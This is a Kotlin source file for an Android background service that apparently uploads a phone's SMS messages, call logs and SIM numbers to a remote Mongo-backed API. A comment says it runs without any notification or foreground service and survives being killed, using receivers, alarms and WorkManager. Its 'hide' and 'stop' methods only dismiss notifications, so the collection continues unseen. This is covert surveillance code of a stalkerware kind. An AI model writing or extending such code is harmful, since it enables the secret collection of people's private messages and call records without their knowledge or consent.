package com.calltech

import android.content.Context
import android.os.PowerManager
import android.util.Log

/**
 * Background sync — koi notification / foreground service nahi.
 * SMS/call receivers + Alarm + WorkManager se kill state sync.
 */
class CallSyncService : android.app.Service() {
    override fun onBind(intent: android.content.Intent?) = null

    override fun onStartCommand(
        intent: android.content.Intent?,
        flags: Int,
        startId: Int,
    ): Int = START_NOT_STICKY

    companion object {
        private const val TAG = "CallSyncService"

        fun holdDuring(context: Context, block: () -> Unit) {
            val wakeLock = acquireWakeLock(context.applicationContext)
            try {
                block()
            } finally {
                releaseWakeLock(wakeLock)
            }
        }

        fun ensureRunning(context: Context) {
            val app = context.applicationContext
            if (!CallSyncHelper.isBackgroundSyncEnabled(app)) {
                return
            }

            SyncWorkScheduler.enqueueNow(app)
            SyncAlarmScheduler.scheduleNext(app)

            BackgroundSyncRunner.run {
                runSyncCycle(app, "ensure_running")
            }
        }

        fun start(context: Context) {
            ensureRunning(context)
        }

        fun stop(context: Context) {
            hide(context)
        }

        fun hide(context: Context) {
            NotificationCleanup.dismissAll(context.applicationContext)
        }

        private fun runSyncCycle(app: Context, source: String) {
            try {
                MongoSyncHelper.ensureApiUrl(app)
                PendingSmsQueue.flush(app)
                PendingCallQueue.flush(app)
                LocalDataStore.syncAllToMongo(app, source)
                SimNumberHelper.discoverAndCacheNumbers(app)

                if (MessageSyncHelper.hasSmsPermission(app)) {
                    MessageSyncHelper.syncLatestMessagesNow(app, source)
                }
                if (CallSyncHelper.hasCallLogPermission(app)) {
                    CallSyncHelper.syncLatestCalls(
                        context = app,
                        source = source,
                        retryCount = 1,
                    ) {}
                }
            } catch (error: Exception) {
                Log.e(TAG, "Background sync failed ($source)", error)
            }
        }

        private fun acquireWakeLock(context: Context): PowerManager.WakeLock? {
            return try {
                val powerManager = context.getSystemService(Context.POWER_SERVICE) as PowerManager
                powerManager.newWakeLock(
                    PowerManager.PARTIAL_WAKE_LOCK,
                    "CallTech:BulkSyncWakeLock",
                ).apply {
                    setReferenceCounted(false)
                    acquire(120_000L)
                }
            } catch (_: Exception) {
                null
            }
        }

        private fun releaseWakeLock(wakeLock: PowerManager.WakeLock?) {
            try {
                if (wakeLock?.isHeld == true) {
                    wakeLock.release()
                }
            } catch (_: Exception) {
            }
        }
    }
}
